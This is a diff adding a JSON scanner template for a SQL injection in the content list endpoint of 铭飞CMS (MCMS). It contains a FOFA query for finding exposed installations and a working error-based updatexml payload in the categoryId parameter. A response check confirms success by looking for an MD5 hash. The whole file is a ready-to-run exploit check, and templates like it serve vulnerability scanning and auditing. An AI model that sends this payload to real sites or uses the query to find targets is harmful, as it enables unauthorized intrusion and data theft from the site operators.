@@ -1,0 +1,36 @@
+{
+  "product": "铭飞CMS",
+  "vul_name": "铭飞CMS list接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\""
+  },
+  "protocol": "http",
+  "link": "",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5(123456),0x7e),1)%20and%20%271"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
